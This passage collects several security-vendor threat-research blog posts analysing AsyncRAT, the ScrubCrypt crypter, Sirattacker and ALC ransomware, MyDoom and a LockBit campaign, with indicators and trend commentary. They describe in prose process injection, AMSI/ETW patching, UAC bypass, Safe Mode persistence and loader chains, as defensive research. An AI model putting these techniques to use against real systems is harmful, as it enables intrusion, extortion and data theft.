Process Explorer software, we can see that the created notepad.exe process is now a sub-process of explorer.exe, and its status is “Suspended” (without “Running”), as shown in Figure 4.2. Subsequently, it leverages “syscall” to invoke APIs, such as NtAllocateVirtualMemory() and NtWriteVirtualMemory(), for allocating memory in the target process (notepad.exe). It transfers some data to the just-allocated memory containing the encrypted AsyncRAT client and a piece of ASM code in charge of decrypting and deploying the AsyncRAT client into the target process notepad.exe. It then proceeds to create an APC object and add it to the APC queue of a thread of notepad.exe by using the API NtQueueApcThread() with a thread function parameter pointing to the copied ASM code. Finally, the API NtResumeThread() is called to resume the execution of the previously suspended notepad.exe process. AsyncRAT is a Remote Access Trojan (RAT) that allows attackers to gain control of a victim's computer system. Its features include stealing sensitive data, monitoring user activity, and executing commands remotely on the infected device. AsyncRAT is written in C# language and runs in a .Net Framework environment. Since it is fileless in this phishing campaign, I needed to dump it from the notepad.exe process for deep analysis. Once AsyncRAT starts, it decrypts a group of setting values in its Main() function, as shown in Figure 5.1. The setting values for the captured AsyncRAT indicate: A crypto key was used to decrypt the following setting values: Once set, the AsyncRAT is ready to send information collected from the victim’s device to its C2 server and then wait for control commands from the C2 server to remotely control it. For secure communications, AsyncRAT uses the SSL protocol to deliver its packets. Below is a screenshot of the first packet that AsyncRAT sends to its C2 server before sending it over SSL. The data of the packet is saved in a unique format. All packets between AsyncRAT and its C2 server are in the same format, including value type, value name, and value. From the packet, I extracted the information in the following table as an example to explain the packet format. The value of “Packet” is the control command, where the “ClientInfo” command is used to send basic information about both the victim’s device and the AsyncRAT client to the C2 server, like a registration packet. AsyncRAT also supports many other control commands to control the victim’s machine. Most of the control commands AsyncRAT provides: \"blankscreen+\", \"blankscreen-\", \"botKiller\", \"BotKiller\", \"chat\", \"chat-\", \"chatExit\", \"chatWriteInput\", \"ClientInfo\", \"close\", \"disableDefedner\", \"dos\", \"dosAdd\", \"Error\", \"executeDotNetCode\", \"fileManager\", \"GetXmr\", \"keyLogger\", \"limeUSB\", \"Logs\", \"pcOptions\", \"Ping\", \"Ping!)\", \"plugin\", \"pong\", \"processManager\", \"Received\", \"remoteDesktop\", \"reportWindow\", \"reportWindow-\", \"restart\", \"savePlugin\", \"sendFile\", \"sendMemory\", \"sendMessage\", \"sendPlugin\", \"shell\", \"shellWriteInput\", \"socketDownload\", \"thumbnails\", \"thumbnailsStop\", \"torrent\", \"uac\", \"uninstall\", \"visitURL\", \"webcam\", \"xmr\", and more. Features that AsyncRAT supports: Backdoor Access:  The attacker can remotely perform whatever activities they want within the infected system. Run Executable Files: The attacker can transfer any executable file and run it on the victim’s device. Credential Stealing: AsyncRAT can grab various user credentials from different applications, including Chrome, Firefox, Edge, and Internet Explorer. Remote Desktop Control: The attacker can achieve remote desktop control of the infected system. File Manager: AsyncRAT permits attackers to have full access to files on a targeted computer. They can move, delete, copy, or modify files. File Searcher: The attacker can search files on the infected system. The picture below shows how it starts the File Searcher feature on the AsyncRAT server. Process Manager: The attacker can check and kill running processes on the victim’s device. Keylogging: The malware has a keylogger function that can keep track of all keystrokes made on the victim’s device, monitoring both offline and online activities. DDoS Attacks: AsyncRAT can launch widespread DDoS attacks from multiple systems under its control to target specific websites. Audio Recording: The malware can unmute the microphone on infected machines to record audio. Webcam Control: AsyncRAT can enable the victim’s webcam to capture images and video. I have explained how the phishing campaign started with a SPAM email, how a Microsoft OneNote file is involved, and what BAT files are leveraged to download more malicious files (like Io.bat, view.zip). We also explored the anti-analysis techniques it uses to evade being detected and analyzed by security researchers. I elaborated on how a complicated strategy is used to protect its code, such as loading executable files from the PE Resource section, always keeping the key modules fileless, and creating a target notepad.exe process on behalf of explorer.exe. Finally, I demonstrated what the packet format looks like, what essential information AsyncRAT can collect from the victim’s device, and what control commands AsyncRAT supports to fully control the victim’s device. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs and C2 server are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail has recognized the phishing email as SPAM. FortiGuard Antivirus service detects the attached OneNote file, as well as the follow-up downloaded lo.bat file and view.zip files, with the AV signatures “MSOffice/Agent.OXZ!tr“, “BAT/Agent.OXZ!tr”, and “MSOffice/Agent.PLI!tr”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.

    "title": "Reduce, Reuse, Recycle: Bad Actors Practicing the Three Rs",
    "link": "https://www.fortinet.com/blog/threat-research/bad-actors-resurrecting-old-tactics",
    "content": "FortiGuard Labs Threat Research Malware has a way of grabbing all the attention in the media and keeping companies on their toes. The world watched as wipers were deployed to Ukrainian organizations after the Russian invasion of Ukraine, which marked the beginning of a time of instability that included ransomware and InfoStealers, as well. Adding to the negative cybersecurity load of 2022, the contemporary version of ransomware celebrated its 10-year anniversary. And if that weren’t enough, our FortiGuard Labs researchers have seen that a cybercriminal, like any sensible businessperson, are big proponents of getting the most out of their resources. You might say they’re practicing the reduce, reuse, recycle principles, but instead of being focused on environmental concerns, they’re retrofitting code to enable more successful criminal outcomes. Apparently, it’s not just diamonds that are forever – so are certain strands of malware.In the second half of 2022,our researchers saw the resurgence of familiar names in the malware, wiper, and botnet space - including Emotet and GandCrab, to name a few. The top five ransomware families, out of a total of 99 detected, accounted for about 37% of all ransomware activity in the second half of 2022. The most prominent malware was GandCrab, a RaaS threat that surfaced in 2018. FortiGuard Labs also investigated a group of Emotet variations to assess their propensity for borrowing and recycling code. According to the research, Emotet has undergone significant diversification, with variants dividing into about six different \"species\" of malware. Not content to simply automate threats, cyber-attackers aggressively improve upon successful innovations. Cyber adversaries have an entrepreneurial spirit and are constantly seeking for ways to increase the value of current investments and knowledge in attack operations to increase their effectiveness and profitability. Reusing code allows hackers to build on previously successful results while iteratively improving their attacks and getting past defensive barriers. In fact, in our analysis of the most common malware for the second half of 2022, we saw that the bulk of the top ranks were occupied by malware that was more than a year old. Some of them—like Lazurus—have existed for more than 10 years and are pillars of the history of the internet. Along with reusing code, attackers are maximizing opportunities by using well-known threats and existing infrastructure. For instance, if we look at botnet threats by pervasiveness, many of the top botnets aren’t novel. Mirai and Gh0st.Rat has continued to dominate across all geographies, which isn’t surprising.  Among the top five observed botnets, only RotaJakiro was created in the last couple of years. Although there’s a tendency to disregard more recent risks as history, businesses in all industries must maintain their vigilance. Such \"vintage\" botnets remain in wide circulation because they continue to be highly effective. Because there is a return on investment, clever hackers will continue to exploit current botnet infrastructure and transform it into increasingly persistent versions using highly specialized techniques. In particular, the manufacturing sector, Managed Security Service Providers (MSSP), and the telco/carrier sector were all major targets of Mirai in the second half of 2022. This demonstrates an intensive effort of criminals to target those sectors with tried-and-true techniques. It can be difficult for enterprises to keep up with constantly changing threats. The reuse of code and modularization made possible by a burgeoning Crime-as-a-Service ecosystem underscores the value of prompt security services that can help enterprises fend off threats with AI-powered, coordinated defense. Moreover, companies can achieve quicker detection and enforcement across the full attack surface if there is integration across all security devices, thereby lowering their overall risk posture. Beyond technology, cybersecurity strategy really comes down to people. It takes a global team effort with robust, trustworthy relationships and collaboration among cybersecurity participants across public and commercial organizations and sectors to successfully disrupt cybercriminal supply chains. Cyber awareness and hygiene training must be a cornerstone of any company – this must extend to all employees, not just those in IT or security functions. Anestimated 80% of organizationsreported last year that they’d suffered one or more breaches due to a lack of cybersecurity skills and awareness. The latter half of 2022 was interesting, to say the least. Understanding the trends from this period will help you better understand how to keep your companies operating safely. According to what we have observed over the past six months, we cannot dismiss older threats. They are still actively evolving and searching for both unpatched places and fresh vulnerabilities that will enable them to spread. Companies that use the above information and best practices will be better prepared to face what’s next on the threat horizon.

    "title": "Old Cyber Gang Uses New Crypter – ScrubCrypt",
    "link": "https://www.fortinet.com/blog/threat-research/old-cyber-gang-uses-new-crypter-scrubcrypt",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Cryptojacks vulnerable systemsSeverity level:Critical Between January and February 2023, FortiGuard Labs observed a payload targeting an exploitable Oracle Weblogic Server in a specific URI. This payload extracts ScrubCrypt, which obfuscates and encrypts applications and makes them able to dodge security programs. It already has an updated version, and the seller’s webpage (Figure 1) guarantees that it can bypass Windows Defender and provide anti-debug and some bypass functions. We analyzed the malware injected into a victim’s system and, as part of our analysis, identified the threat actor as 8220 Gang using collected indicators. This mining group first appeared in 2017. The name “8220” comes from its original use of port 8220 for network communications. In this article, we will elaborate on the details of ScrubCrypt and other malware delivered by this crypter in the past. Based on our observations over the past two months, these attacks originate from 163[.]123[.]142[.]210 and 185[.]17[.]0[.]19. The attackers have targeted an HTTP URI, “wls-wsat/CoordinatorPortType,” which belongs to an Oracle Weblogic server. The corresponding traffic capture is shown in Figure 2. The attack attempts to download a PowerShell named “bypass.ps1”. The partial PowerShell script, “bypass.ps1,” shown in Figure 3, has had its main code and strings encoded to make it harder to be detected by AntiVirus solutions. After three rounds of adding constants, reversing, and Based64 decoding, we finally uncovered clear text. The first variable, “$c”, contains ScrubCrypt. The detail of this variable will be discussed in the next section. The rest of the variables, from “$d” to “$f”, are for AMSI and ETW evasion, which is executed by “iex” at the end of the attack. After decoding “$c”, we find the script for the next step, shown in Figure 4. It has another Base64-encoded code saved in the victim’s temp folder with the filename “OracleUpdate.bat” to masquerade as a normal system file. Once the fake “update” file is decoded and saved, it executes with the Windows style “hidden” to silently load ScrubCrypt. ScrubCrypt is a crypter used to secure applications with a unique BAT packing method. The batch file is shown in Figure 5. The encrypted data at the top can be split into four parts using backslash “\\”. The final two parts are the key and iv for AES CBC decryption.After Base64 decode, AES decryption, and unzip, we can finally see the code. The organized code in Figure 6 is a typical .NET Reflective Injection. In the last two lines of the code, the variable “$BmoFi” disables Event Tracing for Windows (ETW) by patching the EtwEventWrite function with 0xC3 (ret), and “$BbIpF” is used to invoke a .NET named “ScrubCrypt” for the final payload, shown in Figure 7. The .NET code first modifies the extension as null, checks to see if a debugger is attached, and checks the system’s operating system version to decide whether or not to proceed. It then gets the process ID to establish a melting file (self-delete) after execution, shown in Figure 8. Then, it determines whether the current user belongs to the Windows user group “BUILTIN\\Administrators” (RID: 0x220). If the user is not in that specific group, it decodes the “UAC” data from the “Resources” section and saves it to “C:\\Windows\\system32\\perfmon.exe”. The DLL file is shown in Figure 9. It is used to retrieve username information from the compromised endpoint. It then decodes the PowerShell command:“cmd /c timeout /t 3 /nobreak & “C:\\Windows\\System32\\perfmon.exe””to pause the command processor for three seconds, ignore any keystrokes, and execute the DLL. Next, it enumerates the driver in the system to bypass scans from Windows Defender using the command in Figure 10. For persistence, it grabs registry values from “Run” and “RunOnce” to determine if this .NET file is already set. If not, it saves the .NET file to a “Roaming” folder named “BSLkE.bat” and adds a registry value to run a VBS file with the content shown in Figure 11. Finally, it decodes data “P” from the “Resources” section using the XOR key in Figure 12 and unzips it. Then it loads the decoded data named “miner” in memory and invokes the payload, as shown in Figure 13. We collected several ScrubCrypt samples in February, and each payload is a little different. On 2/14, ScrubCrypt loads “miner” and invokes the process “explorer.exe” to start the miner process to server 45[.]142[.]122[.]11:8080, shown in Figures 14 and 15. This IP address and wallet were used for the 8220 Gang attack in January 2023. On 2/15, ScrubCrypt extracted “bat”, which unzipped its array data and used “InvokeMember” to execute “Eoengmvsg.dll”, shown in Figure 16. It decodes the three C2 servers and three port numbers shown in Figure 17. Once that victim device receives the C2 server’s packets, it downloads another three files from 79[.]137[.]203[.]156, shown in Figure 18. The first, “miner.bat”, is a ScrubCrypt BAT file. The other two files are compressed PE files: “plugin_3.dll” and “plugin_4.dll” (Figure 19). They exhibit behavior similar to that described inthis previous article. On 2/16, ScrubCrypt loaded a module also named “bat’, as shown in Figure 20, but the data for its unzip is from its “Resources” section. It communicates with the same C2 server, and downloads two files from 163[.]123[.]142[.]210. These files are also compressed PE files named “plugin_3.dll” and “plugin_4.dll”. They are identical to the files from 2/15 and start crypto miner activity using the same configuration, as shown in Figure 21. The crypto wallet address,46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ, and the server IP address used in Monero miner have all been used by the 8220 Gang in the past. It’s why we believe the whole attack was launched by this threat actor, although the port number used is no longer 8220. 8220 Gang is a well-known miner group that usually leverages public file-sharing websites and targets system vulnerabilities to infiltrate a victim’s environment. Within a very short time, it has evolved to use a newer crypter variant, “ScrubCrypt.” Below is its complete attack chain. ScrubCrypt includes evasion and encryption functions, making it harder for anti-virus programs to detect 8220 Gang activity. Users should be aware of this updated crypter and keep their systems patched.

    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-sirattacker-acl",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Sirattacker and ALC ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Sirattacker is one of the latest Chaos ransomware variants. It was first released in the middle of February 2023. Several versions of Chaos ransomware builders are available in Dark Web underground networks, which allow anyone to generate Chaos ransomware with custom configurations. FortiGuard Labs previously published the following blogs on Chaos ransomware: Sirattacker ransomware is likely distributed as an Ethereum mining app because all samples include an Ethereum file icon, and some are even named “ETH [3-digit number].exe”. Another Chaos ransomware variant called “Bruh,” also masquerading as a cryptocurrency generator, was reported in the previous week. While there is no apparent connection between Sirattacker and Bruh ransomware, it’s a curious coincidence. Once the Sirattacker ransomware is executed, it encrypts files on the victim’s machine and adds random four-letter file extensions to their filenames. Older Chaos ransomware variants are known to overwrite files larger than 2,117,152 bytes with random bytes, which makes file recovery impossible (unless the affected files are properly backed up). In some cases, attackers demand a ransom payment, knowing that most files are unrecoverable. Luckily, Sirattacker ransomware samples appear to be generated using a newer Chaos ransomware generator, as larger files are encrypted instead of overwritten. Once files are encrypted, Sirattacker displays a ransom note on the Command Prompt. The ransomware then replaces the desktop wallpaper with its own. The new wallpaper contains an almost identical message to the ransom note and asks victims to contact the attacker by email. Currently, theBitcoinwallet the Sirattacker ransomware actor uses has no money left in it. However, the wallet shows that in the latest transaction, recorded on February 24, 2023, the attacker sent a small amount of Bitcoin (0.00150106) to another wallet. However, as of this writing, that wallet was holding a whopping 538.57136296 Bitcoin—worth more than $12 million. Over the last few months, the attacker appears to have systematically transferred Bitcoin in and out of the wallet. For example, on February 24, 2023, $35.13 worth of Bitcoin was deposited to the attacker’s wallet. That amount of Bitcoin was transferred to another wallet on the same day. Note that screenshots were edited to highlight the attacker’s transactions. While there is no evidence that those transactions are associated with the Sirattacker ransomware, it potentially indicates that the Sirattacker ransomware threat actor has been actively involved in other illicit activities over the past few months. ALC is a recently reported ransomware. It is known for a message aimed at “Russia and its counterpart” in its ransom note. FortiGuard Labs analyzed the ransomware and found it is much more than meets the eye. Information on the infection vector used by this group is not currently available. However, it is not likely to differ significantly from other ransomware groups. Once ALC ransomware runs, it creates several files on the victim machine’s Desktop. Note that some ALC ransomware samples do not create the AlcDif.exe file shown in the image below. RUS!.txt is a ransom note containing a message with incorrect word choices, indicating that the authors are not native English speakers. For example, “Decrypted” is likely meant to be “Encrypted,” and Russsia is a misspelling of “Russia.” Per the ransom note, ALC ransomware targets “Russia and its counterparts,” which may imply China, Iran, Belarus, and others. The ransom note asks the victim to contact the attacker on Telegram, an encrypted instant messaging app popular with cybercriminals. However, no contact information or ransom price is provided in the note. Some of the ALC ransomware samples create an executable file named AlcDif.exe. It is used to create a more sophisticated ransom note. Once the ransomware executes the file, it runs in full screen in a probable attempt to scare victims by imitating a lock screen. If the victim uses multiple monitors, the program only occupies the primary monitor. The program also “toggles” Task Manager. Task Manager gets disabled when the program is run for the first time. Running it again reenables it. This is the ransom note displayed by AlcDif.exe: Unlike the ransom note in the text file, this ransom screen provides a contact address, the attacker’s crypto wallet information, a ransom price, and a unique ID assigned to the victim. However, the ransom screen lacks coherence as the provided crypto wallet does not exist, and the QR code does not work. Also, the ransom screen lists a cryptocurrency ransom of 554 Monero (over $80,000 using the exchange rate on February 27th, 2023) even though a $2,000 price tag is listed under the QR code. Most importantly, ALC ransomware does not encrypt any files, classifying it as more of a scareware. However, the ransomware sets up cryptography (it generates a random value, hashes it, creates a GO cipher object for AES, encrypts the AES key using the hard-coded RSA public key, and writes the encrypted key in an ALCKEY file), enumerates files on the compromised machine, and saves a list of those files in a separate text file for each drive found (i.e., “C.txt” contains a list of files found in C drive). That evidence leads us to two possible conclusions: either the attacker tries to cheat money out of victims knowing full well the program does not encrypt files, or the program is still in beta. Fortinet customers are already protected from these malware variants through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Sirattacker ransomware variants with the following AV signatures: FortiGuard Labs detects known ALC ransomware variants with the following AV signatures: File-based IOCs: SHA256 Malware a80908bcd96a8df6070eb9a9c83739c8d95c34d7d81b890bacda91bb05c53267 Sirattacker ransomware b3be7cf75ded8a3dec4a78a9dcf32ff433ac5fa5743d5c27b77dd67f9d6a427b Sirattacker ransomware b8a277a731485717c01a7d20fb6af795fa823a219b9b01ee2f476889610a28da Sirattacker ransomware d4d7fb3c49feed626b24e5db8735547d7b244705342dcc301faafa0b9ac72bf1 Sirattacker ransomware e6de7531d2c7900ff73b30e33170fd7530fb7771518503c65203b1a419a8d11e Sirattacker ransomware 75b45fea6000b6cb5e88b786e164c777c410e11fdcf1ff99b66b43096223d734 Sirattacker ransomware bbc6a34b48a4c71a4d9c2ae2d8c975f3b6caf2e17b86057ccbcb6686d1d5a642 ALC ransomware bff07ae5ccea66b658783fcf940eaf6baa453b534af2ebe9b70f14923871d82f ALC ransomware dc50ac15414b7274533cde5e1b28bfaa85353de38d4b21a8cb996412c0f6e432 ALC ransomware 0abe1ab9c75395a4ca829028d9c8c6530bd3bfda49e4b856b6f3539b9aa36ea5 ALC ransomware 1c5377db817c03f3c2711d351e380611291b5935ba0e2b0de763e4ef470e5bab ALC ransomware 456961cba9a8dfce1b66081c6a73c2f1ec676fcdedac24c678f890a3425e7260 ALC ransomware 48b074b48bde3f15ca28983f26e855bafd6f19e8240d938b14f31417b39d9fd2 ALC ransomware 7efa5acd25e6276d122b2e2b8055a64dc4c757fc6067d3307973327154a507ff ALC ransomware 84d4ca11c23a20bb220c15dbe3a363fb774081b6106c351fc9d8eab4f3b5b62c ALC ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "link": "https://www.fortinet.com/blog/threat-research/just-because-its-old-doesnt-mean-you-throw-it-away-including-malware",
    "content": "FortiGuard Labs Threat Research Art, automobiles, and wine are often associated with things that appreciate in value as they age. Malware isn’t usually thought of this way, as most threat actors strive to keep their tools as current as possible with new lures and exploitation techniques. However, every once in a while, a campaign appears that turns this paradigm on its head. FortiGuard Labs came across one such recent campaign using the MyDoom worm. MyDoom (also known as Novarg and Mimail) was first discovered back in 2004. And while it has seen some updates and modifications since its introduction, it is an anachronism in the malware world that continues to operate well beyond expectations. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium The typical MyDoom phishing e-mail contains subjects referencing a delivery error or testing. Email headers contain a rejection reason and a custom “Content-Type”. There is also an attachment that may or may not be zipped. This attachment (unless zipped) is the MyDoom executable. FortiGuard Labs encountered the following message subjects in our recent investigation: The following attachment names were also found to be used repeatedly: The MyDoom executables attached to its phishing e-mails have an extension hidden by default by most Windows deployments (.cmd, .scr, .com, etc.). This increases the chances that users won’t identify it as malicious. Despite the extension, the file is a 32-bit Windows executable packed using the UPX (Ultimate Packer for Executables) packer (https://en.wikipedia.org/wiki/UPX) to compress and make it more difficult to analyze. With that being said, UPX has been around for quite some time. When used without modification, it is quite easy to decompress the original executable using the tool itself. The packer decompresses and executes the actual MyDoom code. Upon execution, an attempt to alter the Windows firewall settings is made. A user logged on to the system would see a request to grant access for the executable to communicate out through the Firewall. MyDoom next makes a copy of itself, places it in the “Temp” folder (C:\\Users\\<user>\\AppData\\Local\\Temp), and changes the name to a known Windows application/process. In this case, it used “lsass.exe”. It also creates a file full of garbage text that is not referenced again once created. MyDoom communicates over port 1042 to both send and receive. It rotates through a number of possible C2 domains in an attempt to locate an active one. As part of the legacy of spreading through file-sharing utilities, MyDoom also litters the “C:\\Program Files\\Common Files\\Microsoft Shared” folder with multiple versions of itself. It renames itself as some now very old and obsolete applications (e.g., Kazaa Lite) with a random name or phrase attached. Application names include: Despite its advanced age, there are still fresh infections of MyDoom occurring in the wild, along with corresponding phishing events. This goes to show that even older malware can still be dangerous no matter their age Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services: FortiGuard customers are protected against this latest MyDoom campaign, which is blocked by FortiMail. The following (AV) signature detects the malware samples mentioned in this blog W32/MyDoom.M@mm W32/Mydoom.E!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats, including theFortiPhish Phishing Simulation Service, which uses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness. It includes a module on Internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks.

    "title": "Can You See It Now? An Emerging LockBit Campaign",
    "link": "https://www.fortinet.com/blog/threat-research/emerging-lockbit-campaign",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs has observed a new LockBit ransomware campaign during last December and January using a combination of techniques effective against AV and EDR solutions. LockBit has been one of the more dangerous ransomware, active since 2019. It was part of several successful attacks against a large variety of industries, including critical infrastructure. This blog post discusses the infection chain and Tactics, Techniques, and Procedures (TTPs) of this campaign. Descriptions of the attack refer to the stages outlined in Figure 1 below. The attack starts with a .img container (1) and a social engineering technique of displaying a single file once it’s mounted while hiding the rest of its files from the user. It can also cause malware analysts to miss the payloads while examining the samples manually. The user is then prompted to open the single visible shortcut (2) file. In some of the cases that we’ve observed, a python script is executed (2.1) using the official Python embed package. The only purpose of the script is to run the subsequent BAT scripts. Some variants used a known UAC bypass method abusing the legitimatefodhelper.exe(3.1). This enables the attacker’s BAT file to run in a new elevated process without the user’s approval. The BAT script (4) does several things: 1.     Changes the password of the logged-in user. 2.     Copies its files to C:\\ProgramData. 3.     Ensures that after the system reboots, it logs in without user interaction (usingSysInternals Autologon). 4.     Tries to - a.     Set the next reboot to be in Safe Mode using bcdedit.exe. b.     Register a new service that will run its VBS script (4.1) using sc.exe. c.      Sets the service to run also in Safe-Mode using reg.exe. 5.     If it fails, it sets in the registry a BAT file (4.2) to be run on logon as another UI shell by Winlogon. 6.     Reboots the machine. The ransomware executable resides within a password-protected archive. The script that runs after boot executes another BAT script (4.3) to extract the ransomware payload. It uses the 7-zip archiver and then runs it with a ‘-pass’ argument that is needed for the malicious executable to unpack itself. The final payload is LockBit. Analysts from TrendMicro have published ananalysisof the ransomware. Targeting focuses on Spanish-speaking victims – all samples target Mexican or Spanish firms, mainly in the consulting and law sectors. Ransomware note: Your data are stolen and encrypted The data will be published on TOR website if you do not pay the ransom You can contact us and decrypt one file for free on this TOR site (you should download and install TOR browser first https://torproject.org) http://<onion address> Your company id for log in: <unique id> The detection rate of the samples in VirusTotal was a minimal single digit, with some completely undetected, suggesting the campaign’s methods are effective in defense evasion. Delivery through a .img container bypasses the Mark of The Web (MOTW) protection mechanism. Multi-stage scripts that extract a password-protected ransomware executable, which is unpacked only when run with a unique password, allow evading traditional signature-based detection. The malware authors have shown a creative and wide-ranging usage of signed, legitimate executables: the mounting of .img files by Windows Explorer, python execution by a signed interpreter, the extraction of encrypted archives by 7-zip, and automatic log-in using Sysinternals’ Autologon. This allows for minimal reliance on custom code, trimming development costs, and staying under the radar of EDRs. This campaign’s highly evasive nature demonstrates that attackers continue to leverage increasingly obscure methodologies to avoid detection. This unique combination of executables wasn’t seen in previous LockBit attacks. These payloads may be related to the LockBit builderleak in late 2022. Hence, a definitive attribution to the original group behind LockBit, or its affiliates, may be difficult. Other cybercriminals would want to associate themselves with the deterrence already afforded by past acts of LockBit. FortiEDR detects and blocks these threats out of the box without any prior knowledge or special configuration. It does this using its post-execution prevention engine to identify malicious activities: All network IOCs have been added to the FortiGuard WebFilter blocklist. FortiGuard Antivirus has coverage in place as follows: W32/Lockbit.K!tr.ransom The FortiGuard Antivirus service engine is included in Fortinet’s FortiGate, FortiMail, FortiClient, and FortiEDR solutions. In addition, as part of our membership in theCyber Threat Alliance, details of this threat were shared in real-time with other Alliance members to help create better protections for customers.

    "title": "Key Findings from the 2H 2022 FortiGuard Labs Threat Report",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-threat-report-key-findings-2h-2022",
    "content": "FortiGuard Labs Threat Research In the first half of 2022, FortiGuard Labs observed an overall increase in attack frequency paired with the explosive growth of new variants associated with familiar tactics. While attack volume isn’t showing any signs of slowing, the back half of the year gave rise to some other distinct trends in activity. For starters, our team witnessed destructive wipermalware attacksimpacting more organizations across the globe, as well as enterprising cybercriminals reimagining existing botnets and reusing code to power new—and more sophisticated—attacks. In our2H 2022 Threat Landscape Report, we examine the cyber-threat landscape over the year's second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations in the new year and beyond. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed around the world during this same period. Below are key takeaways from the report. We’re increasingly seeing cybercriminals take a “work smarter, not harder” approach to unveiling new tactics. From new advanced persistent cybercrime tactics to upgrading old-school botnets like Mirai, bad actors continually find more sophisticated ways to infiltrate networks, making every organization regardless of size or industry a target. In the first half of the year, we saw a resurgence in wiper malware and,as we predicted, this destructive attack playbook has only widened its foothold during the second half of 2022. Wiper malware expanded into other countries, driving a 53% increase in wiper activity from Q3 to Q4. While we initially observed wiper malware being developed and deployed by nation-state actors—particularly in parallel with the Russia-Ukraine war—we’re now seeing wipers being scaled and deployed worldwide. These new strains are increasingly being picked up by cybercriminal groups and used throughout the growing Cybercrime-as-a-Service (CaaS) network. Cybercriminals are also now developing their own wiper malware which is being used readily across CaaS organizations, meaning that the threat of wiper malware is more widespread than ever and all organizations are a potential target, not just those based in Ukraine or surrounding countries. Bad actors always seek to maximize their existing investments and knowledge in attack efforts. Botnet and malware code reuse are efficient, cost-effective ways for criminals to build upon successful attack vectors while making iterative changes, fine-tuning their attacks to sidestep detection. Similar to musicians who remix chart-topping songs, cybercriminals are reimagining old attack strains that proved successful in the past and reintroducing new and enhanced versions. In the second half of 2022, we witnessed the resurgence of familiar names among botnets and malware variants, many of which are more than a year old. For example, when examining botnet threats by prevalence, many of the top botnets are older. Mirai and Gh0st RAT continue to be popular across all regions, yet out of the top five, only RotaJakiro is from the current decade. While there are several new bots on the block, likeRaspberryRobin, we’re observing an interesting rise in attackers’ reliance on established threats. We saw a similar trend with malware. Some top strains observed in 2H 2022 such as Lazarus—which originated in 2010—are household names in cyber history. We also examined a collection of different Emotet variants to analyze their tendency to borrow code from one another. Our research showed that cybercriminals continue creating spinoffs of Emotet, with new variants breaking into roughly six different “species” of malware. Although it may be tempting to write off older threats as history, these anecdotes are a reminder that organizations across all sectors need to remain vigilant. Code reuse and retrofitting—fueled by a growing CaaS ecosystem—underscores the importance of using comprehensive, consolidated security services powered by automation to counter threats. Ransomware remains in full force, with cybercriminals constantly introducing new variants, largely thanks to the proliferation ofRansomware-as-a-Service (RaaS). In the second half of 2022, the top five ransomware families accounted for roughly 37% of all ransomware. GandCrab, aRaaS malwareintroduced in 2018, topped the list. Despite the threat actors behind GandCrab announcing that they were retiring, there were many iterations of GandCrab created during its heyday. There may still be a long tail of variants coming from this operation, which makes the work of groups likeThe Cybercrime Atlas Initiativeessential as they aim to dismantle these large-scale criminal operations permanently. Analyzing cybercriminal 